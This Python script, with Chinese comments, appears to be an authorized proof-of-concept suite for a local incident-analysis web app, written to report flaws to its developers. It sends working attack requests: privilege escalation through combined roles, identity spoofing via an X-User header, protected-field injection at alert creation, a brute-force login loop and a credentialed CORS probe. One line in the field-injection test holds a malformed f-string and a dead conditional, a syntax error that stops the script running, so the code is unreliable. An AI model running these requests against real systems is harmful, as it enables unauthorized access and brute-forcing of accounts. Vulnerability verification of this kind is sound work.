"""
研判分析工作台 - 权限模块漏洞验证脚本（本地测试环境，强证据链版）
=================================================================
本脚本针对启动中的 http://localhost:5000 自动化验证 H1/H2/M1/M3/L4 等漏洞。

核心设计：每个 POC 都输出「攻击前快照 → 攻击请求 → 攻击后快照 → 差异 → 审计核对」，
        让开发团队能客观判断漏洞是否真实存在，而不只看 HTTP 状态码。

使用前提：
  1. 已通过 start.bat 或 `python backend/app.py --serve-frontend` 启动应用
  2. 后端监听 http://localhost:5000
  3. 首次启动会在控制台打印一次性 admin 口令

使用方法（项目根目录）：
  python tools/perm_poc.py --admin-pw <控制台打印的口令>
  python tools/perm_poc.py --admin-pw <口令> --base http://127.0.0.1:5000

输出：
  - 控制台实时打印每步的请求/响应/数据快照
  - 末尾输出汇总表（漏洞编号 / 名称 / 是否利用成功 / 关键证据）
  - 完整报告写入 tools/perm_poc_report.md

注意：仅用于本地授权测试环境，请勿对生产或他人系统使用。
"""
import argparse
import json
import sys
import time
from pathlib import Path

import requests

BASE = "http://localhost:5000"
CSRF_HEADER = "X-CSRF-Token"
REPORT_LINES = []
# 每个漏洞的证据摘要，用于最终汇总
EVIDENCE = {}


def log(msg: str = ""):
    print(msg)
    REPORT_LINES.append(msg)


def sep(title: str):
    log("")
    log("=" * 72)
    log(f"  {title}")
    log("=" * 72)


def subsep(title: str):
    log("")
    log(f"  --- {title} ---")


class Session:
    """封装登录态 + CSRF 双提交。"""

    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.username = None
        self.csrf = None

    def login(self, username: str, password: str):
        r = self.s.post(f"{self.base}/api/auth/login",
                        json={"username": username, "password": password})
        if r.status_code != 200:
            raise RuntimeError(f"登录失败 {username}: {r.status_code} {r.text}")
        self.username = username
        self.csrf = self.s.cookies.get("csrf_token")
        return r.json()

    def me(self):
        return self.s.get(f"{self.base}/api/auth/me").json()

    def _h(self, extra=None):
        h = {}
        if self.csrf:
            h[CSRF_HEADER] = self.csrf
        if extra:
            h.update(extra)
        return h

    def post(self, path, body=None, extra=None):
        return self.s.post(f"{self.base}{path}", json=body, headers=self._h(extra))

    def put(self, path, body=None, extra=None):
        return self.s.put(f"{self.base}{path}", json=body, headers=self._h(extra))

    def delete(self, path, body=None, extra=None):
        return self.s.delete(f"{self.base}{path}", json=body, headers=self._h(extra))

    def get(self, path, params=None, extra=None):
        return self.s.get(f"{self.base}{path}", params=params, headers=self._h(extra))


# ---------- 测试账号 ----------

TEST_USERS = [
    ("poc_analyst", ["analyst"], "PocAnalyst!2026", "POC研判员"),
    ("poc_responder", ["responder"], "PocRespond!2026", "POC处置人"),
    ("poc_multi", ["responder", "analyst"], "PocMulti!!2026", "POC双角色"),
    ("poc_reporter", ["reporter"], "PocReport!2026", "POC上报人"),
]


def setup_users(admin: Session) -> bool:
    sep("准备：创建测试账号")
    for username, roles, pw, disp in TEST_USERS:
        r = admin.post("/api/auth/users", {
            "username": username, "password": pw,
            "display_name": disp, "roles": roles, "must_change": False,
        })
        if r.status_code == 200:
            log(f"  [+] 创建 {username} ({','.join(roles)})  OK")
        elif "已存在" in r.text:
            log(f"  [~] {username} 已存在，复用")
        else:
            log(f"  [-] 创建 {username} 失败: {r.status_code} {r.text}")
            return False
    return True


def cleanup_users(admin: Session):
    subsep("清理：停用测试账号")
    r = admin.get("/api/auth/users")
    if r.status_code != 200:
        log(f"  [-] 获取用户列表失败: {r.status_code}")
        return
    users = r.json().get("data", {}).get("users", [])
    by_name = {u["username"]: u["id"] for u in users}
    for username, _, _, _ in TEST_USERS:
        uid = by_name.get(username)
        if uid:
            admin.put(f"/api/auth/users/{uid}", {"status": "disabled"})
            log(f"  [+] 已停用 {username}")


# ---------- 辅助：快照与审计 ----------

def subtask_snapshot(client: Session, alert_id: str, sub_id: str) -> dict:
    """取子任务当前状态快照（通过 list_subtasks 端点）。"""
    r = client.get(f"/api/incident/alerts/{alert_id}/subtasks")
    if r.status_code != 200:
        return {}
    subs = r.json().get("data", {}).get("subtasks", [])
    return next((s for s in subs if s["id"] == sub_id), {})


def alert_snapshot(client: Session, alert_id: str) -> dict:
    r = client.get(f"/api/incident/alerts/{alert_id}")
    if r.status_code != 200:
        return {}
    return r.json().get("data", {})


def audit_snapshot(admin: Session, alert_id: str) -> list:
    """取该告警的审计记录（admin 有 audit.view 权限）。"""
    r = admin.get("/api/incident/audit", params={"target_id": alert_id, "limit": 50})
    if r.status_code != 200:
        return []
    return r.json().get("data", {}).get("items", [])


def fmt_json(obj) -> str:
    return json.dumps(obj, ensure_ascii=False, indent=2)


# ============================================================
# POC: H1 - 子任务端点垂直越权（多角色绕过执行人限制）
# ============================================================

def poc_h1(admin: Session) -> bool:
    sep("H1 - 子任务更新端点垂直越权（多角色绕过「执行人仅改 status」限制）")
    log("漏洞位置: backend/api/incident.py:654  PUT /api/incident/subtasks/<subtask_id>")
    log("漏洞原理:")
    log("  该端点无 @require_perm 装饰器。函数内分两个分支:")
    log("    - 持有 subtask.manage -> 可改 title/team/assignee/due_at/status（全字段）")
    log("    - 仅持有 subtask.execute -> 仅可改 status（白名单拦截其他字段）")
    log("  当用户同时持有 responder+analyst 两个角色时，responder 给 subtask.execute，")
    log("  analyst 给 subtask.manage。代码用 `if 'subtask.manage' in permissions` 先判，")
    log("  于是该用户进入 manage 分支，绕过了 execute 分支的「仅改 status」限制。")
    log("  → 这是垂直越权：普通处置人获得了管理员级子任务编辑能力。")
    log("")

    # --- 场景搭建 ---
    subsep("场景搭建")
    alert_id = create_alert(admin, "H1测试告警")
    # 让 poc_multi 成为该告警处理人（handler），否则 _scope_ok 会拦
    admin.put(f"/api/incident/alerts/{alert_id}/handlers",
              {"names": ["poc_analyst", "poc_multi"]})
    log(f"  [+] 创建告警 {alert_id}，处理人=[poc_analyst, poc_multi]")

    ana = Session(BASE).login("poc_analyst", "PocAnalyst!2026")
    sub_id = add_subtask(ana, alert_id, "poc_responder", "H1原始标题")
    log(f"  [+] analyst 创建子任务 {sub_id}，assignee=poc_responder, title='H1原始标题'")

    # --- 攻击前快照 ---
    subsep("攻击前快照（用 analyst 读取子任务当前状态）")
    before = subtask_snapshot(ana, alert_id, sub_id)
    log(f"  title    = {before.get('title')!r}")
    log(f"  assignee = {before.get('assignee')!r}")
    log(f"  status   = {before.get('status')!r}")
    log(f"  due_at   = {before.get('due_at')!r}")
    log("")

    # --- 攻击1：单角色 responder 尝试改 title（对照组，应被拒） ---
    subsep("对照组：单角色 responder 尝试改 title（预期 403）")
    resp = Session(BASE).login("poc_responder", "PocRespond!2026")
    log(f"  请求: PUT /api/incident/subtasks/{sub_id}")
    log(f"  请求体: {{'title': '被responder篡改'}}")
    log(f"  身份: poc_responder (仅 responder 角色, 仅 subtask.execute 权限)")
    r1 = resp.put(f"/api/incident/subtasks/{sub_id}", {"title": "被responder篡改"})
    log(f"  响应: HTTP {r1.status_code}")
    log(f"  响应体: {r1.text[:300]}")
    single_blocked = (r1.status_code == 403)
    log(f"  >>> 单角色 responder {'被拦截 ✅' if single_blocked else '未被拦截 ❌'}")
    log("")

    # --- 攻击2：多角色 poc_multi 改 title + due_at（漏洞利用） ---
    subsep("攻击组：多角色(responder+analyst) 改 title + due_at（预期漏洞：200 成功）")
    multi = Session(BASE).login("poc_multi", "PocMulti!!2026")
    me = multi.me().get("data", {})
    log(f"  身份: poc_multi")
    log(f"  角色: {[r['code'] for r in me.get('roles', [])]}")
    log(f"  权限含: subtask.manage={'subtask.manage' in me.get('permissions', [])}, "
        f"subtask.execute={'subtask.execute' in me.get('permissions', [])}")
    log(f"  请求: PUT /api/incident/subtasks/{sub_id}")
    log(f"  请求体: {{'title': '被多角色篡改的标题', 'due_at': '2099-12-31T23:59:59'}}")
    r2 = multi.put(f"/api/incident/subtasks/{sub_id}",
                   {"title": "被多角色篡改的标题", "due_at": "2099-12-31T23:59:59"})
    log(f"  响应: HTTP {r2.status_code}")
    log(f"  响应体: {r2.text[:300]}")
    log("")

    # --- 攻击后快照 ---
    subsep("攻击后快照（再次用 analyst 读取子任务状态）")
    after = subtask_snapshot(ana, alert_id, sub_id)
    log(f"  title    = {after.get('title')!r}  (攻击前: {before.get('title')!r})")
    log(f"  assignee = {after.get('assignee')!r}  (攻击前: {before.get('assignee')!r})")
    log(f"  status   = {after.get('status')!r}  (攻击前: {before.get('status')!r})")
    log(f"  due_at   = {after.get('due_at')!r}  (攻击前: {before.get('due_at')!r})")
    log("")

    # --- 差异判定 ---
    title_changed = before.get("title") != after.get("title")
    due_changed = before.get("due_at") != after.get("due_at")
    subsep("差异判定")
    log(f"  title 是否被篡改: {'是 ❌' if title_changed else '否 ✅'}")
    log(f"  due_at 是否被篡改: {'是 ❌' if due_changed else '否 ✅'}")

    # --- 审计核对 ---
    subsep("审计记录核对（admin 视角）")
    audits = audit_snapshot(admin, alert_id)
    relevant = [a for a in audits if a.get("action") == "update_subtask"]
    log(f"  该告警的 update_subtask 审计条目数: {len(relevant)}")
    for a in relevant[-3:]:
        log(f"    - actor={a.get('actor')!r}, after={fmt_json(a.get('after_data', {}))[:200]}")
    log("")

    # --- 结论 ---
    subsep("结论")
    if r2.status_code == 200 and title_changed:
        log("  *** 漏洞确认 ***")
        log("  证据链:")
        log(f"    1. 单角色 responder 改 title -> HTTP {r1.status_code} (被拦截)")
        log(f"    2. 多角色(responder+analyst) 改 title -> HTTP {r2.status_code} (通过)")
        log(f"    3. 攻击前 title={before.get('title')!r}")
        log(f"    4. 攻击后 title={after.get('title')!r}")
        log(f"    5. 审计记录显示 actor='poc_multi' 成功执行 update_subtask")
        log("  说明: 同一个用户，仅因多持有一个 analyst 角色，就获得了改 title 的能力，")
        log("        而单角色 responder 被拒。这证明 subtask.manage 分支未校验「调用者")
        log("        是否真的是管理员」，只要权限集里含该权限就放行，导致垂直越权。")
        EVIDENCE["H1"] = (
            f"单角色responder改title={r1.status_code}(拒), "
            f"多角色改title={r2.status_code}(成), "
            f"title: {before.get('title')!r}→{after.get('title')!r}"
        )
        return True
    else:
        log("  未观察到可利用现象（可能已修复或条件不满足）。")
        EVIDENCE["H1"] = f"多角色改title HTTP={r2.status_code}, title_changed={title_changed}"
        return False


# ============================================================
# POC: H2 - _actor() 主体伪造（X-User fallback）
# ============================================================

def poc_h2(admin: Session) -> bool:
    sep("H2 - _actor() 主体伪造（X-User / actor 参数 fallback）")
    log("漏洞位置: backend/api/incident.py:19-24  _actor()")
    log("漏洞原理:")
    log("  _actor() 在 g.current_user 为 None 时回退到 request.headers['X-User']")
    log("  或 request.args['actor']。正常路由下 _require_login 会先 401，fallback 不可达。")
    log("  但这是脆弱的隐式依赖：任何后续改动（新增免登端点、调整 before_request、")
    log("  CORS preflight 处理变化）都可能让 fallback 变为可达，届时客户端可任意伪造身份。")
    log("  本测试验证「当前是否可达」+「已登录时 X-User 是否被忽略」。")
    log("")

    # 测试1：匿名 + X-User
    subsep("测试1: 匿名(无cookie) + X-User: imposter 访问列表")
    r1 = requests.get(f"{BASE}/api/incident/alerts", headers={"X-User": "imposter"})
    log(f"  请求: GET /api/incident/alerts  Headers: {{'X-User': 'imposter'}}")
    log(f"  响应: HTTP {r1.status_code}")
    log(f"  响应体: {r1.text[:200]}")
    anon_blocked = (r1.status_code == 401)
    log(f"  >>> 匿名请求 {'被拦截 ✅' if anon_blocked else '未被拦截 ❌'}")
    log("")

    # 测试2：已登录 analyst + 伪造 X-User: admin 创建告警
    subsep("测试2: 已登录 analyst + 伪造 X-User: admin 创建告警")
    ana = Session(BASE).login("poc_analyst", "PocAnalyst!2026")
    log(f"  真实身份: poc_analyst")
    log(f"  伪造头:   X-User: admin")
    log(f"  请求: POST /api/incident/alerts")
    r2 = ana.post("/api/incident/alerts",
                  {"title": "H2测试-伪造X-User", "source_category": "edr"},
                  extra={"X-User": "admin"})
    log(f"  响应: HTTP {r2.status_code}")
    if r2.status_code == 200:
        aid = r2.json()["data"]["id"]
        detail = ana.get(f"/api/incident/alerts/{aid}").json().get("data", {})
        created_by = detail.get("created_by")
        log(f"  创建告警 id={aid}")
        log(f"  created_by = {created_by!r}  (真实身份=poc_analyst, 伪造身份=admin)")
        if created_by == "poc_analyst":
            log("  >>> X-User 被正确忽略 ✅（g.current_user 优先）")
            xuser_trusted = False
        elif created_by == "admin":
            log("  >>> *** X-User 被信任！created_by 被伪造为 admin ❌ ***")
            xuser_trusted = True
        else:
            log(f"  >>> created_by={created_by}，需人工判断")
            xuser_trusted = None
    else:
        log(f"  响应体: {r2.text[:200]}")
        xuser_trusted = None
    log("")

    # 结论
    subsep("结论")
    if anon_blocked and not xuser_trusted:
        log("  当前路由配置下 fallback 不可达，X-User 在已登录时被忽略。")
        log("  *** 但 fallback 代码仍存在，属脆弱依赖 ***")
        log("  证明方式：查看 backend/api/incident.py 第 19-24 行，_actor() 函数体")
        log("           第 24 行 `return request.headers.get('X-User') or ...` 即为风险点。")
        log("  风险等级：代码审计级（当前不可利用，但任何路由调整都可能使其可达）。")
        EVIDENCE["H2"] = "当前不可达；已登录时 X-User 被忽略；fallback 代码仍存"
        return False
    else:
        log("  *** 存在主体伪造风险 ***")
        EVIDENCE["H2"] = f"匿名可达={not anon_blocked}, X-User被信任={xuser_trusted}"
        return True


# ============================================================
# POC: M1 - create_alert 受保护字段越权设置
# ============================================================

def poc_m1(admin: Session) -> bool:
    sep("M1 - create_alert 受保护字段越权设置（owner/status/conclusion/reporter）")
    log("漏洞位置: backend/services/incident_service.py:777-832  create_alert()")
    log("漏洞原理:")
    log("  service 层 create_alert 直接读取 raw.get('owner'/'status'/'conclusion'/'reporter')，")
    log("  依赖 API 层 (incident.py:248) pop 掉 protected 字段。若 pop 失效或通过其他")
    log("  入口（如 upload_alert / save_alert_from_json / 服务令牌）调用 service 层，")
    log("  客户端可任意设置归属与状态。本测试验证 API 层 pop 是否真正生效。")
    log("")

    ana = Session(BASE).login("poc_analyst", "PocAnalyst!2026")
    subsep("攻击请求: analyst 创建告警时夹带受保护字段")
    log(f"  身份: poc_analyst")
    log(f"  请求: POST /api/incident/alerts")
    payload = {
        "title": "M1测试-夹带owner/status/conclusion",
        "source_category": "edr",
        "owner": "poc_responder",        # 试图冒充归属
        "status": "closed",               # 试图绕过研判流程直接关闭
        "conclusion": "true_positive",    # 试图直接定性
        "reporter": "admin",              # 试图伪造上报人
        "created_by": "admin",            # 试图伪造创建者
    }
    log(f"  请求体: {fmt_json(payload)}")
    r = ana.post("/api/incident/alerts", payload)
    log(f"  响应: HTTP {r.status_code}")
    log(f"  响应体: {r.text[:300]}")
    log("")

    if r.status_code != 200:
        log("  创建失败，无法验证。")
        EVIDENCE["M1"] = f"创建失败 HTTP={r.status_code}"
        return False

    aid = r.json()["data"]["id"]
    subsep("攻击后快照: 读取告警实际落库字段")
    detail = ana.get(f"/api/incident/alerts}/{aid}").json().get("data", {}) \
        if False else ana.get(f"/api/incident/alerts/{aid}").json().get("data", {})
    log(f"  owner       = {detail.get('owner')!r}        (攻击者期望: 'poc_responder')")
    log(f"  status      = {detail.get('status')!r}         (攻击者期望: 'closed')")
    log(f"  conclusion  = {detail.get('conclusion')!r}  (攻击者期望: 'true_positive')")
    log(f"  created_by  = {detail.get('created_by')!r}    (攻击者期望: 'admin', 真实: 'poc_analyst')")
    log("")

    subsep("差异判定")
    owner_tampered = detail.get("owner") == "poc_responder"
    status_tampered = detail.get("status") == "closed"
    conclusion_tampered = detail.get("conclusion") == "true_positive"
    created_by_tampered = detail.get("created_by") == "admin"
    log(f"  owner 被篡改:       {'是 ❌' if owner_tampered else '否 ✅'}  (实际: {detail.get('owner')!r})")
    log(f"  status 被篡改:      {'是 ❌' if status_tampered else '否 ✅'}  (实际: {detail.get('status')!r})")
    log(f"  conclusion 被篡改:  {'是 ❌' if conclusion_tampered else '否 ✅'}  (实际: {detail.get('conclusion')!r})")
    log(f"  created_by 被篡改:  {'是 ❌' if created_by_tampered else '否 ✅'}  (实际: {detail.get('created_by')!r})")
    log("")

    subsep("结论")
    if any([owner_tampered, status_tampered, conclusion_tampered, created_by_tampered]):
        log("  *** 漏洞确认 *** API 层未剥离受保护字段，客户端可越权设置。")
        EVIDENCE["M1"] = (
            f"owner={detail.get('owner')!r}, status={detail.get('status')!r}, "
            f"created_by={detail.get('created_by')!r}"
        )
        return True
    else:
        log("  API 层已剥离受保护字段，当前 POST /alerts 路径安全。")
        log("  *** 但 service 层仍直接读取这些字段，纵深防御缺失 ***")
        log("  证明方式：查看 backend/services/incident_service.py 第 805-809 行，")
        log("           raw.get('status')/'conclusion'/'owner'/'reporter' 仍被直接使用。")
        log("  风险等级：代码审计级（当前 API 层已堵，但 service 层是脆弱防线）。")
        EVIDENCE["M1"] = "API层已剥离；service层仍直接读取（纵深防御缺失）"
        return False


# ============================================================
# POC: M3 - 登录端点无频率限制/锁定
# ============================================================

def poc_m3(admin: Session) -> bool:
    sep("M3 - 登录端点无频率限制/锁定")
    log("漏洞位置: POST /api/auth/login (auth.py:134) + auth_service.verify_login")
    log("漏洞原理:")
    log("  代码注释明确「不启用失败自动锁定」。failed_login_count 字段存在但未使用。")
    log("  攻击者可对登录端点进行无限次暴力破解。")
    log("")

    subsep("攻击: 对 poc_analyst 连续发起 20 次错误口令登录")
    log(f"  目标: {BASE}/api/auth/login")
    log(f"  用户名: poc_analyst")
    log(f"  尝试次数: 20")
    codes = []
    t0 = time.time()
    for i in range(20):
        r = requests.post(f"{BASE}/api/auth/login",
                          json={"username": "poc_analyst", "password": f"wrong_{i}"})
        codes.append(r.status_code)
    elapsed = time.time() - t0
    log(f"  完成 20 次尝试，耗时 {elapsed:.2f}s")
    log(f"  状态码序列: {codes}")
    all_401 = all(c == 401 for c in codes)
    log(f"  >>> 全部 401: {all_401}  (无任何 429 限流或 423 锁定)")
    log("")

    subsep("验证: 错误尝试后用正确口令登录")
    r = requests.post(f"{BASE}/api/auth/login",
                      json={"username": "poc_analyst", "password": "PocAnalyst!2026"})
    still_loginable = (r.status_code == 200)
    log(f"  请求: POST /api/auth/login  {{username: 'poc_analyst', password: '正确口令'}}")
    log(f"  响应: HTTP {r.status_code}")
    log(f"  >>> 20 次错误后仍可登录: {still_loginable}  (账号未被锁定)")
    log("")

    subsep("结论")
    if all_401 and still_loginable:
        log("  *** 漏洞确认 ***")
        log("  证据:")
        log(f"    1. 20 次错误口令登录全部返回 401（无 429/423 限流或锁定）")
        log(f"    2. 第 21 次用正确口令登录成功 HTTP 200（账号未因失败被锁）")
        log(f"    3. 总耗时 {elapsed:.2f}s，平均每次 {elapsed/20*1000:.0f}ms，无延迟退避")
        log("  说明: 攻击者可无限次尝试，配合常见口令字典可暴力破解。")
        EVIDENCE["M3"] = f"20次错误全401, 正确口令仍可登录, 无限流无锁定"
        return True
    else:
        log("  可能存在限流或锁定（与代码注释不符，需复核）。")
        EVIDENCE["M3"] = f"all_401={all_401}, still_loginable={still_loginable}"
        return False


# ============================================================
# POC: L4 - CORS 允许携带凭证跨域
# ============================================================

def poc_l4() -> bool:
    sep("L4 - CORS 配置允许携带凭证跨域")
    log("漏洞位置: backend/app.py:67-74 + backend/config.py:17-21")
    log("漏洞原理:")
    log("  默认 ALLOWED_ORIGINS 含 http://localhost:3000 且 supports_credentials=True。")
    log("  生产环境若未覆盖 ALLOWED_ORIGINS，开发者本机的恶意页面可携带用户 cookie")
    log("  发起跨域请求，窃取会话。")
    log("")

    subsep("测试: 模拟来自 http://localhost:3000 的跨域预检")
    r = requests.options(f"{BASE}/api/auth/login",
                         headers={"Origin": "http://localhost:3000",
                                  "Access-Control-Request-Method": "POST"})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    log(f"  请求: OPTIONS /api/auth/login  Origin: http://localhost:3000")
    log(f"  响应: HTTP {r.status_code}")
    log(f"  Access-Control-Allow-Origin:      {acao!r}")
    log(f"  Access-Control-Allow-Credentials: {acac!r}")
    log("")

    # 也测一个实际 GET
    r2 = requests.get(f"{BASE}/api/auth/me",
                      headers={"Origin": "http://localhost:3000"})
    acao2 = r2.headers.get("Access-Control-Allow-Origin", "")
    acac2 = r2.headers.get("Access-Control-Allow-Credentials", "")
    log(f"  请求: GET /api/auth/me  Origin: http://localhost:3000")
    log(f"  响应: HTTP {r2.status_code}")
    log(f"  Access-Control-Allow-Origin:      {acao2!r}")
    log(f"  Access-Control-Allow-Credentials: {acac2!r}")
    log("")

    subsep("结论")
    if "localhost:3000" in acao and acac.lower() == "true":
        log("  *** 配置确认 ***")
        log(f"  证据: 响应头 ACAO={acao!r}, ACAC={acac!r}")
        log("  说明: 后端放行 localhost:3000 携带凭证。若生产环境未覆盖 ALLOWED_ORIGINS，")
        log("        攻击者在开发者本机部署恶意页面即可窃取登录会话。")
        EVIDENCE["L4"] = f"ACAO={acao!r}, ACAC={acac!r}"
        return True
    else:
        log("  CORS 未放行 localhost:3000（可能已覆盖配置）。")
        EVIDENCE["L4"] = f"ACAO={acao!r}, ACAC={acac!r}"
        return False


# ============================================================
# 辅助：创建告警/子任务
# ============================================================

def create_alert(client: Session, title="POC告警", cat="edr") -> str:
    r = client.post("/api/incident/alerts", {"title": title, "source_category": cat})
    if r.status_code != 200:
        raise RuntimeError(f"创建告警失败: {r.status_code} {r.text}")
    return r.json()["data"]["id"]


def add_subtask(client: Session, alert_id: str, assignee: str, title="POC子任务") -> str:
    r = client.post(f"/api/incident/alerts/{alert_id}/subtasks",
                    {"title": title, "assignee": assignee, "team": "应急组"})
    if r.status_code != 200:
        raise RuntimeError(f"创建子任务失败: {r.status_code} {r.text}")
    return r.json()["data"]["id"]


# ============================================================
# 主流程
# ============================================================

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://localhost:5000")
    parser.add_argument("--admin-pw", default=None)
    args = parser.parse_args()
    global BASE
    BASE = args.base.rstrip("/")

    sep("研判分析工作台 - 权限模块漏洞验证（强证据链版）")
    log(f"目标: {BASE}")
    log(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log(f"说明: 每个 POC 输出「攻击前快照→请求→响应→攻击后快照→差异→审计核对」")

    # 健康检查
    try:
        h = requests.get(f"{BASE}/health", timeout=5)
        if h.status_code != 200:
            log(f"  [-] 健康检查失败: {h.status_code}")
            sys.exit(1)
        log(f"  [+] 后端可达: {h.json()}")
    except Exception as e:
        log(f"  [-] 无法连接 {BASE}: {e}")
        log("      请先启动: python backend/app.py --serve-frontend")
        sys.exit(1)

    # admin 口令
    admin_pw = args.admin_pw
    if not admin_pw:
        admin_pw = input("请输入 admin 一次性口令（首次启动控制台打印）: ").strip()
    if not admin_pw:
        log("  [-] 未提供 admin 口令，退出")
        sys.exit(1)

    admin = Session(BASE)
    try:
        admin.login("admin", admin_pw)
    except RuntimeError as e:
        log(f"  [-] admin 登录失败: {e}")
        sys.exit(1)
    log(f"  [+] admin 登录成功")

    if not setup_users(admin):
        sys.exit(1)

    results = {}
    try:
        results["H1"] = poc_h1(admin)
        results["H2"] = poc_h2(admin)
        results["M1"] = poc_m1(admin)
        results["M3"] = poc_m3(admin)
        results["L4"] = poc_l4()
    finally:
        cleanup_users(admin)

    # 汇总
    sep("漏洞验证结果汇总")
    log(f"{'编号':<6}{'名称':<46}{'利用':<8}")
    log("-" * 64)
    summary = [
        ("H1", "子任务端点垂直越权（多角色绕过执行人限制）", results.get("H1")),
        ("H2", "_actor() 主体伪造（X-User fallback）", results.get("H2")),
        ("M1", "create_alert 受保护字段越权设置", results.get("M1")),
        ("M3", "登录端点无频率限制/锁定", results.get("M3")),
        ("L4", "CORS 允许携带凭证跨域", results.get("L4")),
    ]
    for code, name, ok in summary:
        flag = "成功 ❌" if ok else "未利用"
        log(f"{code:<6}{name:<46}{flag:<8}")

    log("")
    log("关键证据摘要（用于提交开发团队）:")
    log("-" * 64)
    for code, name, _ in summary:
        ev = EVIDENCE.get(code, "（无）")
        log(f"  [{code}] {name}")
        log(f"       {ev}")
    log("")

    report_path = Path(__file__).parent / "perm_poc_report.md"
    report_path.write_text("\n".join(REPORT_LINES), encoding="utf-8")
    log(f"完整报告已写入: {report_path}")


if __name__ == "__main__":
    main()
